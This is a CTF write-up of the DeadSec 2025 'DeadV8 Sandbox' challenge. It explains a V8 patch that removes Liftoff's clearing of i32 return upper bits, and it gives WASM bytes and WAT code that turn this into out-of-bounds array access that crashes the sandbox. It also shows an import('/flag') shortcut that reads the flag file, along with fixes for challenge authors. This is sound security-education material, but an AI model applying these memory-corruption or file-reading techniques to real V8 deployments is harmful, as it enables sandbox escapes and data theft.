# DeadV8 Sandbox (PWN, 194 points)

> V8 Sandbox Is Good Mitigation

FLAG = DEAD{1cbe367a5b22356d_99fcc4e79f0ca8da}

## Disclaimer

This is the first V8 challenge I have ever solved, I am not familiar with V8 internals so I apologize if I some of the things I explain are not fully correct, this is just how I understand the code given by the patch file.

## Background

This challenge was a V8 sandbox pwn challenge for the DeadSec 2025 CTF. We are given a zip file that contains the typical V8 challenge contents. The goal was to get the flag from V8 by crashing its sandbox. There was what I believe to be an unintentional way to solve the challenge which I will explain at the end of the writeup.

## Analyzing the Patch File

After unzipping the challenge file I opened up the patch file and saw these changes 
```diff

diff --git a/src/sandbox/testing.cc b/src/sandbox/testing.cc
index 2938e0fc987..cba900825ec 100644
--- a/src/sandbox/testing.cc
+++ b/src/sandbox/testing.cc
@@ -19,6 +19,10 @@
 #include <signal.h>
 #include <sys/mman.h>
 #include <unistd.h>
+#include <iostream>
+#include <fstream>
+#include <string>
+
 #endif  // V8_OS_LINUX

 #ifdef V8_USE_ADDRESS_SANITIZER
@@ -701,6 +705,16 @@ void CrashFilter(int signal, siginfo_t* info, void* void_context) {
   // re-executed and will again trigger the access violation, but now the
   // signal will be handled by the original signal handler.
   UninstallCrashFilter();
+
+  std::ifstream file("/flag");
+
+  if( file.is_open() ){
+    std::string line;
+    while(std::getline(file, line)){
+      std::cout << line << std::endl;
+    }
+    file.close();
+  }

   PrintToStderr("\n## V8 sandbox violation detected!\n\n");
 }
diff --git a/src/wasm/baseline/liftoff-assembler.cc b/src/wasm/baseline/liftoff-assembler.cc
index 4387e749074..6f517bf71d4 100644
--- a/src/wasm/baseline/liftoff-assembler.cc
+++ b/src/wasm/baseline/liftoff-assembler.cc
@@ -884,13 +884,13 @@ void LiftoffAssembler::FinishCall(const ValueKindSig* sig,
         DCHECK(!loc.IsAnyRegister());
         reg_pair[pair_idx] = LiftoffRegister::from_external_code(
             rc, lowered_kind, loc.AsRegister());
-#if V8_TARGET_ARCH_64_BIT
+//#if V8_TARGET_ARCH_64_BIT
         // See explanation in `LiftoffCompiler::ParameterProcessor`.
-        if (return_kind == kI32) {
-          DCHECK(!needs_gp_pair);
-          clear_i32_upper_half(reg_pair[0].gp());
-        }
-#endif
+//        if (return_kind == kI32) {
+//          DCHECK(!needs_gp_pair);
+//          clear_i32_upper_half(reg_pair[0].gp());
+//        }
+//#endif
       } else {
         DCHECK(loc.IsCallerFrameSlot());
         reg_pair[pair_idx] = GetUnusedRegister(rc, pinned);

```

I decided I would need the V8 source code to understand the patch file better. You can find out how to clone V8 here [https://v8.dev/docs/source-code](https://v8.dev/docs/source-code). After downloading the source code you can apply the patch using 
```bash
git apply <patch_dir>/probe.diff
```

I went straight to the files the patch file changed and figured out the goal was to use Web Assembly (WASM) to some how crash the V8 sandbox. The specific file that matters for us is the "liftoff-assembler.cc". The patch specifically comments out a check that is supposed to clear the upper bytes of a 32 bit return type. Not knowing about why that check matters I decided to research more about the Liftoff compiler and how it works with the V8 sandbox. I found this article [https://retr0.zip/blog/abusing-Liftoff-assembly-and-efficiently-escaping-from-sbx.html](https://retr0.zip/blog/abusing-Liftoff-assembly-and-efficiently-escaping-from-sbx.html). The article explains it better than I will can and I recommend reading it. Since there shouldn't be any 64 bit registers in the V8 sandbox my assumption of what the patch does is make it so instead of there being a 32 bit offset there is now a 64 bit pointer for a 32 bit return type.  

## Creating an Exploit

This is where I hit a road block, I understand what I need to do but I do not know how to exploit it. I started looking looking at V8s test code specifically for the liftoff compiler that could use the memory corruption API. Reason for the memory corruption API is because the binary on the server is ran with the sandbox testing flag which enables memory corruption primitives. I spotted a file called liftoff-wasmarray-i64-indexing.js which contained a wasm module builder. So I decided to copy and past the test files code into a JavaScript file and then copy the wasm-module-builder.js file into the same directory as the challenge binary. when I ran the test code it crashed the V8 sandbox printing 

```
## V8 sandbox violation detected!

Received signal 11 SEGV_MAPERR 566300112361

==== C stack trace ===============================

./d8(+0x631007) [0x563117107007]
/usr/lib/libc.so.6(+0x3def0) [0x7f1d40b74ef0]
[0x3dd6b9d24ae5]
[end of stack trace]
``` 
if we go to the testing.cc file that was patched we will see right under the patch added code we will see that same V8 sandbox violation text. I knew I wouldn't be able to use the wasm module builder outside of a local instance so I looked through the code and saw it had a toBuffer function. I printed out the WASM code, then copied and pasted it into an array in a modified script. I ran it again and it still worked so I created a python script to send the JavaScript code to the server and was greated with the same text plus the flag. 

## After the CTF

I decided that I should learn what the test script actually created for the WASM binary. I tried using a toolchain called WABT, to convert the given array to a Web Assembly Text(wat) file. Here was my script to turn that array into a wasm file 

```python
wasm_code = bytearray([0,97,115,109,1,0,0,0,1,40,6,80,0,94,120,1,80,0,96,1,126,1,127,80,0,96,1,126,1,126,96,1,127,1,100,0,96,2,100,0,126,1,127,96,3,100,0,126,127,0,3,6,5,1,2,3,4,5,4,10,1,64,0,112,1,1,1,210,1,11,7,57,5,6,102,110,95,105,95,108,0,0,6,102,110,95,108,95,108,0,1,11,97,108,108,111,99,95,117,56,97,114,114,0,2,9,117,56,97,114,114,95,103,101,116,0,3,9,117,56,97,114,114,95,115,101,116,0,4,10,51,5,4,0,65,0,11,4,0,32,0,11,7,0,32,0,251,7,0,11,14,0,32,0,32,1,65,0,17,1,0,251,13,0,11,16,0,32,0,32,1,65,0,17,1,0,32,2,251,14,0,11,0,59,4,110,97,109,101,1,52,5,0,6,102,110,95,105,95,108,1,6,102,110,95,108,95,108,2,11,97,108,108,111,99,95,117,56,97,114,114,3,9,117,56,97,114,114,95,103,101,116,4,9,117,56,97,114,114,95,115,101,116])

with open("test_wasm.wasm", "wb") as f:
    f.write(wasm_code)
```
When I tried converting the wasm file to a wat file I kept getting an error. Turns out a WASM binary cannot have an array or an 8 bit integer, only WASM GC(garbage collector) can. It is a newer specification for WASM to add garbage collection plus a few nice features like arrays, structs, and 9 bit integers. The specification plus compiler can be cloned and compiled from here [https://github.com/WebAssembly/gc](https://github.com/WebAssembly/gc). You can convert WASM to wat but it doesn't really give you meaningful names so I decided to recreate the wasm code by hand. That comes to look like this 
```
(module
  ;; types
  (type $u8arr (sub (array (mut i8))))
  (type $sig_i_l (sub (func (param i64) (result i32))))
  (type $sig_l_l (sub (func (param i64) (result i64)))) 
  (type $sig_u8arr_i (func (param i32) (result (ref $u8arr))))
  (type $sig_i_u8arrl (func (param (ref $u8arr)) (param i64) (result i32)))
  (type $sig_v_u8arrli (func (param (ref $u8arr)) (param i64) (param i32)))

  ;; create table
  (table 1 1 funcref (ref.func $fn_l_l))

  ;; int functions
  (func $fn_i_l (type $sig_i_l)
    i32.const 0
  )
  
  (func $fn_l_l (type $sig_l_l)
    local.get 0
  )

  ;; array functions
  (func $alloc_u8arr (type $sig_u8arr_i)
    local.get 0
    array.new_default $u8arr
  )

  (func $u8arr_get (type $sig_i_u8arrl)
    local.get 0
    local.get 1
    i32.const 0
    (call_indirect 0 (type $sig_i_l))
    (array.get_u $u8arr)
  )
  
  (func $u8arr_set (type $sig_v_u8arrli)
    local.get 0
    local.get 1
    i32.const 0
    (call_indirect 0 (type $sig_i_l))
    local.get 2
    (array.set $u8arr)
  )

  ;; exports
  (export "fn_i_l" (func $fn_i_l))
  (export "fn_l_l" (func $fn_l_l))
  (export "alloc_u8arr" (func $alloc_u8arr))
  (export "u8arr_get" (func $u8arr_get))
  (export "u8arr_set" (func $u8arr_set))
)

```

you can compile it using the wasm gc compiler by typing 
```bash

./wasm -d test.wat -o test.wasm
```

if we test it in the exploit script we see that it crashes the binary as well. 

## Unintentional Solution 

The unintentional way to solve this challenge was to use the import function like so 
```js 
import("/flag");
``` 
that is mainly due to the challenge author giving us the location of the flag file in the patch file given. The reason it works is due to the way the import function works, which as its name implies imports code from a file. Just so happens you can import any type of file it will just error out displaying whatever creates a javascript error. After talking to a few of the teams after the CTF ended this is how they solved it, my belief is I was one of the few to solve it the intended I did. I have seen this unintentional solution in a different CTF so I will point out two different ways that you can "patch" this unintentional solution for future V8 challenges. There are two ways a challenge author can stop this unintentional solution they could put the flag on a seperate line and then create javascript code that wont work properly. Here is an example

```
(;;

FLAG{test}
```

If you try the import way of solving the challenge it will error out saying 
```
SyntaxError: Unexpected token ';'
(;;
 ^
SyntaxError: Unexpected token ';'
```

so the only way to get the flag would be to solve it how the author intended. The second way is by making the flag filename randomized and put its name in an environment variable. That is how the downunderctf author patched their V8 challenge and created a second challenge specifcally for people who wanted to solve it intentionally. 